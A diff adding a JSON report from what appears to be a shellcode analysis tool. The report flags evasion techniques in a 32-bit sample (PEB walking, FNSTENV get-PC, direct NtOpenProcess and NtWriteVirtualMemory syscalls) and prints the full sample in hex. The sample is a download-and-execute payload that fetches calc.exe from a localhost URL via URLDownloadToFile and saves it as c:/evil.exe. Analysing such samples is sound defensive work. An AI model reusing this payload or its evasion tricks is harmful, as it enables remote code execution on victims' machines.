@@ -1,0 +1,418 @@
+{
+   "dateAnalyzed": "2021-12-21 14:08:17",
+   "secondsSinceEpoch": 1640117297.739939,
+   "fileType": "rawHex",
+   "bits": 32,
+   "entryPoint": "0x0",
+   "pushret": [
+      {
+         "address": "0x19c",
+         "pushOffset": [
+            "0x19c",
+            "edx"
+         ],
+         "retOffset": "0x19d",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x19c      push edx ",
+            "0x19d      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x19e",
+         "pushOffset": [
+            "0x19e",
+            "edx"
+         ],
+         "retOffset": "0x19f",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x19e      push edx ",
+            "0x19f      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1a0",
+         "pushOffset": [
+            "0x1a0",
+            "ebx"
+         ],
+         "retOffset": "0x1a1",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1a0      push ebx ",
+            "0x1a1      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1c9",
+         "pushOffset": [
+            "0x1c9",
+            "ebx"
+         ],
+         "retOffset": "0x1ca",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1c9      push ebx ",
+            "0x1ca      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1cb",
+         "pushOffset": [
+            "0x1cb",
+            "edx"
+         ],
+         "retOffset": "0x1cc",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1cb      push edx ",
+            "0x1cc      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x205",
+         "pushOffset": [
+            "0x205",
+            "ebx"
+         ],
+         "retOffset": "0x206",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x205      push ebx ",
+            "0x206      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      }
+   ],
+   "callpop": [
+      {
+         "address": "0x34",
+         "modSecName": "rawHex",
+         "pop_offset": "0x39",
+         "distance": 5,
+         "disassembly": [
+            "0x34       call 0x39 ",
+            "0x39       pop  edx "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      },
+      {
+         "address": "0x1b3",
+         "modSecName": "rawHex",
+         "pop_offset": "0x1b8",
+         "distance": 5,
+         "disassembly": [
+            "0x1b3      call 0x1b8 ",
+            "0x1b8      pop  eax "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      },
+      {
+         "address": "0x1fb",
+         "modSecName": "rawHex",
+         "pop_offset": "0x203",
+         "distance": 8,
+         "disassembly": [
+            "0x1fb      call 0x203 ",
+            "0x200      add  eax, 3 ",
+            "0x203      pop  ebx "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      }
+   ],
+   "PEB": [
+      {
+         "address": "0x111",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x111      mov  edi, dword ptr fs:[0x30] ",
+            "0x118      mov  edi, dword ptr [edi + 0xc] ",
+            "0x11b      jmp  0x125 ",
+            "0x11d      mov  edi, dword ptr [edi + 0x14] ",
+            "0x120      mov  esi, dword ptr [edi + 0x28] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 3
+         }
+      },
+      {
+         "address": "0x1be",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1be      mov  ebp, dword ptr fs:[eax + 0x30] ",
+            "0x1c2      mov  edi, dword ptr [edi + 0xc] ",
+            "0x1c5      mov  edi, dword ptr [edi + 0x14] ",
+            "0x1c8      lodsd eax, dword ptr [esi] ",
+            "0x1c9      push ebx ",
+            "0x1ca      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 4
+         }
+      },
+      {
+         "address": "0x111",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x111      mov  edi, dword ptr fs:[0x30] ",
+            "0x118      mov  edi, dword ptr [edi + 0xc] ",
+            "0x11b      jmp  0x125 ",
+            "0x11d      mov  edi, dword ptr [edi + 0x14] ",
+            "0x120      mov  esi, dword ptr [edi + 0x28] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 3
+         }
+      },
+      {
+         "address": "0x1be",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1be      mov  ebp, dword ptr fs:[eax + 0x30] ",
+            "0x1c2      mov  edi, dword ptr [edi + 0xc] ",
+            "0x1c5      mov  edi, dword ptr [edi + 0x14] ",
+            "0x1c8      lodsd eax, dword ptr [esi] ",
+            "0x1c9      push ebx ",
+            "0x1ca      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 4
+         }
+      }
+   ],
+   "fstenv": [
+      {
+         "address": "0x82",
+         "modSecName": "rawHex",
+         "FPU_offset": "0x7e",
+         "FSTENV_offset": "0x82",
+         "disassembly": [
+            "0x7e       fsqrt  ",
+            "0x80       nop   ",
+            "0x81       nop   ",
+            "0x82       fnstenv [esp + 4] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 4,
+            "NumOpsBack": 10,
+            "printEnd": "0x86"
+         }
+      },
+      {
+         "address": "0xcc",
+         "modSecName": "rawHex",
+         "FPU_offset": "0xc5",
+         "FSTENV_offset": "0xcc",
+         "disassembly": [
+            "0xc5       fsqrt  ",
+            "0xc7       nop   ",
+            "0xc8       nop   ",
+            "0xc9       nop   ",
+            "0xca       nop   ",
+            "0xcb       wait  ",
+            "0xcc       fnstenv [esp + 4] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "NumOpsBack": 10,
+            "printEnd": "0xd0"
+         }
+      },
+      {
+         "address": "0x10c",
+         "modSecName": "rawHex",
+         "FPU_offset": "0x101",
+         "FSTENV_offset": "0x10c",
+         "disassembly": [
+            "0x101      fldpi  ",
+            "0x103      mov  eax, 0x42 ",
+            "0x108      add  eax, 0x20 ",
+            "0x10b      wait  ",
+            "0x10c      fnstenv [eax] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 5,
+            "NumOpsBack": 10,
+            "printEnd": "0x10e"
+         }
+      }
+   ],
+   "heavensGate": [],
+   "syscall": [
+      {
+         "address": "0x14d",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x14d",
+         "disassembly": [
+            "0x14d      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 8,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x15a",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x15a",
+         "disassembly": [
+            "0x15a      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 8,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x17b",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x17b",
+         "disassembly": [
+            "0x17b      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 8,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x1e9",
+         "modSecName": "rawHex",
+         "eax": "0x3a",
+         "c0_offset": "0x1e9",
+         "disassembly": [
+            "0x1e9      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtWriteVirtualMemory\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 8,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x14d",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x14d",
+         "disassembly": [
+            "0x14d      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x15a",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x15a",
+         "disassembly": [
+            "0x15a      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x17b",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x17b",
+         "disassembly": [
+            "0x17b      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x1e9",
+         "modSecName": "rawHex",
+         "eax": "0x3a",
+         "c0_offset": "0x1e9",
+         "disassembly": [
+            "0x1e9      call dword ptr fs:[0xc0] "
+         ],
+         "syscalls": "OS: Windows 10 (20H2) Syscall: NtWriteVirtualMemory\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      }
+   ],
+   "strings": [],
+   "shellcode": {
+      "rawhex": "4c01010009883e604e03000021000000000000002e74657874000000900200003c000000cc020000000000000d00000020005060e8000000005a8d52fb89e581ec0010000052bb8efe1f4be8be0000005a555289c58db21b0200008dba27020000e8fe0000005a5d55528db2e501000056ffb22b02000058ffd05a5d9090d9fa9090d9742404555289c58db22f0200008dba37020000e8c90000005a5d9bd9710cd9750755526a006a008db2f0010000568db2fc010000566a00ffb23702000058ffd05a5dd9fa909090909bd974240455528db23b020000568db24b020000566a006a006a006a006a006a008db2f0010000566a00ffb22702000058ffd05a5dc3d9ebb84200000083c0209bd930fc31ff648b3d300000008b7f0ceb088b7f148b772831d266ad84c074113c4172063c5a77020c20c1c20730c2ebe939da8b47108b3f31db31c36a265831c95364ff15c000000089c183e90b5164ff15c000000075bdc389ea03523c8b527801ea8b5a206a1359b81300000001c864ff15c000000001eb31c957568b368b3b01ef5231d2c1c207321747803f0075f552c352c353c3925a39f0741283c30441394a1875d95e5fe80000000058c35e5fad56648b68308b7f0c8b7f14ad53c352c389eb89de035a248d044b0fb7006a265883c01431db01c389da29c25264ff15c00000008d048603421c8b0001f0abe80300000083c0035b5b53c35e83c30441813effff00000f856effffffc375726c6d6f6e2e646c6c00633a2f6576696c2e65786500687474703a2f2f3132372e302e302e313a383038302f63616c632e65786500c78a31462680acc8ffff0000010000000200000099235dd9ffff000003010000002300000002000000060029000000020000000600380000000200000006003f000000020000000600580000000200000006005e000000020000000600780000000200000006007f00000002000000060088000000020000000600a0000000020000000600a7000000020000000600ba000000020000000600c30000000200000006002e66696c6500000000000000feff00006701776f726b2e61736d00002e7465787400000000000000010000000301900200000d002e6162736f6c757400000000ffff00000300000000000400000002006765746569700000000000000000000002000000000013000000020000000000260000000200000000003700000002000000000048000000020000000000570000000200000000006c0000000200000000007c0000000200000000008a0000000000000000000000020000000000980000000000000000000000020000000000a90000000000000000000000020000000000b30000000000000000000000020000000000c1000000020055524c4d4f4e0000020050415448020000000000cb000000020000000000d5000000020000000000e7000000020000000000fe000000020000000000160100000200000000002b0100000200000000003b010000020000000000500100000200000000006901000000000000000000000200000000007d01000002000000000089010000020040666561742e303001000000ffff00000300950100006d61696e656e747279706f696e74006765745f6d6f64756c655f61646472657373006e6578745f6d6f64756c655f6c6f6f70006d6f64756c655f686173685f6c6f6f7000656e645f686173685f636865636b00656e645f6d6f64756c655f686173685f6c6f6f70006765745f6170695f61646472657373006c6f61645f6170695f68617368006c6f61645f6170695f6e616d65006372656174655f686173685f6c6f6f700063616c6c706f705f31006c6f61645f6170695f616464790063616c6c706f705f320050555454595f55524c004b45524e454c3332484153485441424c45004b45524e454c333246554e4354494f4e535441424c45004b45524e454c33325f43524541544550524f4345535341004b45524e454c33325f4c4f41444c4942524152590055524c4d4f4e484153485441424c450055524c4d4f4e46554e4354494f4e535441424c450055524c4d4f4e5f55524c444f574e4c4f4144544f46494c450050524f434553535f494e464f524d4154494f4e0053544152545550494e464f004578697450726f6365737300",
+      "strlit": "\\x4c\\x01\\x01\\x00\\x09\\x88\\x3e\\x60\\x4e\\x03\\x00\\x00\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2e\\x74\\x65\\x78\\x74\\x00\\x00\\x00\\x90\\x02\\x00\\x00\\x3c\\x00\\x00\\x00\\xcc\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x0d\\x00\\x00\\x00\\x20\\x00\\x50\\x60\\xe8\\x00\\x00\\x00\\x00\\x5a\\x8d\\x52\\xfb\\x89\\xe5\\x81\\xec\\x00\\x10\\x00\\x00\\x52\\xbb\\x8e\\xfe\\x1f\\x4b\\xe8\\xbe\\x00\\x00\\x00\\x5a\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x1b\\x02\\x00\\x00\\x8d\\xba\\x27\\x02\\x00\\x00\\xe8\\xfe\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x8d\\xb2\\xe5\\x01\\x00\\x00\\x56\\xff\\xb2\\x2b\\x02\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\x90\\x90\\xd9\\xfa\\x90\\x90\\xd9\\x74\\x24\\x04\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x2f\\x02\\x00\\x00\\x8d\\xba\\x37\\x02\\x00\\x00\\xe8\\xc9\\x00\\x00\\x00\\x5a\\x5d\\x9b\\xd9\\x71\\x0c\\xd9\\x75\\x07\\x55\\x52\\x6a\\x00\\x6a\\x00\\x8d\\xb2\\xf0\\x01\\x00\\x00\\x56\\x8d\\xb2\\xfc\\x01\\x00\\x00\\x56\\x6a\\x00\\xff\\xb2\\x37\\x02\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\xd9\\xfa\\x90\\x90\\x90\\x90\\x9b\\xd9\\x74\\x24\\x04\\x55\\x52\\x8d\\xb2\\x3b\\x02\\x00\\x00\\x56\\x8d\\xb2\\x4b\\x02\\x00\\x00\\x56\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x8d\\xb2\\xf0\\x01\\x00\\x00\\x56\\x6a\\x00\\xff\\xb2\\x27\\x02\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\xc3\\xd9\\xeb\\xb8\\x42\\x00\\x00\\x00\\x83\\xc0\\x20\\x9b\\xd9\\x30\\xfc\\x31\\xff\\x64\\x8b\\x3d\\x30\\x00\\x00\\x00\\x8b\\x7f\\x0c\\xeb\\x08\\x8b\\x7f\\x14\\x8b\\x77\\x28\\x31\\xd2\\x66\\xad\\x84\\xc0\\x74\\x11\\x3c\\x41\\x72\\x06\\x3c\\x5a\\x77\\x02\\x0c\\x20\\xc1\\xc2\\x07\\x30\\xc2\\xeb\\xe9\\x39\\xda\\x8b\\x47\\x10\\x8b\\x3f\\x31\\xdb\\x31\\xc3\\x6a\\x26\\x58\\x31\\xc9\\x53\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x89\\xc1\\x83\\xe9\\x0b\\x51\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x75\\xbd\\xc3\\x89\\xea\\x03\\x52\\x3c\\x8b\\x52\\x78\\x01\\xea\\x8b\\x5a\\x20\\x6a\\x13\\x59\\xb8\\x13\\x00\\x00\\x00\\x01\\xc8\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x01\\xeb\\x31\\xc9\\x57\\x56\\x8b\\x36\\x8b\\x3b\\x01\\xef\\x52\\x31\\xd2\\xc1\\xc2\\x07\\x32\\x17\\x47\\x80\\x3f\\x00\\x75\\xf5\\x52\\xc3\\x52\\xc3\\x53\\xc3\\x92\\x5a\\x39\\xf0\\x74\\x12\\x83\\xc3\\x04\\x41\\x39\\x4a\\x18\\x75\\xd9\\x5e\\x5f\\xe8\\x00\\x00\\x00\\x00\\x58\\xc3\\x5e\\x5f\\xad\\x56\\x64\\x8b\\x68\\x30\\x8b\\x7f\\x0c\\x8b\\x7f\\x14\\xad\\x53\\xc3\\x52\\xc3\\x89\\xeb\\x89\\xde\\x03\\x5a\\x24\\x8d\\x04\\x4b\\x0f\\xb7\\x00\\x6a\\x26\\x58\\x83\\xc0\\x14\\x31\\xdb\\x01\\xc3\\x89\\xda\\x29\\xc2\\x52\\x64\\xff\\x15\\xc0\\x00\\x00\\x00\\x8d\\x04\\x86\\x03\\x42\\x1c\\x8b\\x00\\x01\\xf0\\xab\\xe8\\x03\\x00\\x00\\x00\\x83\\xc0\\x03\\x5b\\x5b\\x53\\xc3\\x5e\\x83\\xc3\\x04\\x41\\x81\\x3e\\xff\\xff\\x00\\x00\\x0f\\x85\\x6e\\xff\\xff\\xff\\xc3\\x75\\x72\\x6c\\x6d\\x6f\\x6e\\x2e\\x64\\x6c\\x6c\\x00\\x63\\x3a\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x65\\x00\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x3a\\x38\\x30\\x38\\x30\\x2f\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\\xc7\\x8a\\x31\\x46\\x26\\x80\\xac\\xc8\\xff\\xff\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x99\\x23\\x5d\\xd9\\xff\\xff\\x00\\x00\\x03\\x01\\x00\\x00\\x00\\x23\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x29\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x38\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x3f\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x58\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x5e\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x78\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x7f\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x88\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xa0\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xa7\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xba\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\xc3\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x06\\x00\\x2e\\x66\\x69\\x6c\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\xff\\x00\\x00\\x67\\x01\\x77\\x6f\\x72\\x6b\\x2e\\x61\\x73\\x6d\\x00\\x00\\x2e\\x74\\x65\\x78\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x01\\x90\\x02\\x00\\x00\\x0d\\x00\\x2e\\x61\\x62\\x73\\x6f\\x6c\\x75\\x74\\x00\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x02\\x00\\x67\\x65\\x74\\x65\\x69\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x26\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x37\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x57\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x6c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x7c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x8a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xb3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xc1\\x00\\x00\\x00\\x02\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x00\\x00\\x02\\x00\\x50\\x41\\x54\\x48\\x02\\x00\\x00\\x00\\x00\\x00\\xcb\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xd5\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xe7\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xfe\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x16\\x01\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x2b\\x01\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x3b\\x01\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x50\\x01\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x69\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x7d\\x01\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x89\\x01\\x00\\x00\\x02\\x00\\x40\\x66\\x65\\x61\\x74\\x2e\\x30\\x30\\x01\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\x03\\x00\\x95\\x01\\x00\\x00\\x6d\\x61\\x69\\x6e\\x65\\x6e\\x74\\x72\\x79\\x70\\x6f\\x69\\x6e\\x74\\x00\\x67\\x65\\x74\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x61\\x64\\x64\\x72\\x65\\x73\\x73\\x00\\x6e\\x65\\x78\\x74\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x68\\x61\\x73\\x68\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x65\\x6e\\x64\\x5f\\x68\\x61\\x73\\x68\\x5f\\x63\\x68\\x65\\x63\\x6b\\x00\\x65\\x6e\\x64\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x5f\\x68\\x61\\x73\\x68\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x67\\x65\\x74\\x5f\\x61\\x70\\x69\\x5f\\x61\\x64\\x64\\x72\\x65\\x73\\x73\\x00\\x6c\\x6f\\x61\\x64\\x5f\\x61\\x70\\x69\\x5f\\x68\\x61\\x73\\x68\\x00\\x6c\\x6f\\x61\\x64\\x5f\\x61\\x70\\x69\\x5f\\x6e\\x61\\x6d\\x65\\x00\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x68\\x61\\x73\\x68\\x5f\\x6c\\x6f\\x6f\\x70\\x00\\x63\\x61\\x6c\\x6c\\x70\\x6f\\x70\\x5f\\x31\\x00\\x6c\\x6f\\x61\\x64\\x5f\\x61\\x70\\x69\\x5f\\x61\\x64\\x64\\x79\\x00\\x63\\x61\\x6c\\x6c\\x70\\x6f\\x70\\x5f\\x32\\x00\\x50\\x55\\x54\\x54\\x59\\x5f\\x55\\x52\\x4c\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x48\\x41\\x53\\x48\\x54\\x41\\x42\\x4c\\x45\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x46\\x55\\x4e\\x43\\x54\\x49\\x4f\\x4e\\x53\\x54\\x41\\x42\\x4c\\x45\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x5f\\x43\\x52\\x45\\x41\\x54\\x45\\x50\\x52\\x4f\\x43\\x45\\x53\\x53\\x41\\x00\\x4b\\x45\\x52\\x4e\\x45\\x4c\\x33\\x32\\x5f\\x4c\\x4f\\x41\\x44\\x4c\\x49\\x42\\x52\\x41\\x52\\x59\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x48\\x41\\x53\\x48\\x54\\x41\\x42\\x4c\\x45\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x46\\x55\\x4e\\x43\\x54\\x49\\x4f\\x4e\\x53\\x54\\x41\\x42\\x4c\\x45\\x00\\x55\\x52\\x4c\\x4d\\x4f\\x4e\\x5f\\x55\\x52\\x4c\\x44\\x4f\\x57\\x4e\\x4c\\x4f\\x41\\x44\\x54\\x4f\\x46\\x49\\x4c\\x45\\x00\\x50\\x52\\x4f\\x43\\x45\\x53\\x53\\x5f\\x49\\x4e\\x46\\x4f\\x52\\x4d\\x41\\x54\\x49\\x4f\\x4e\\x00\\x53\\x54\\x41\\x52\\x54\\x55\\x50\\x49\\x4e\\x46\\x4f\\x00\\x45\\x78\\x69\\x74\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x00"
+   }
+}
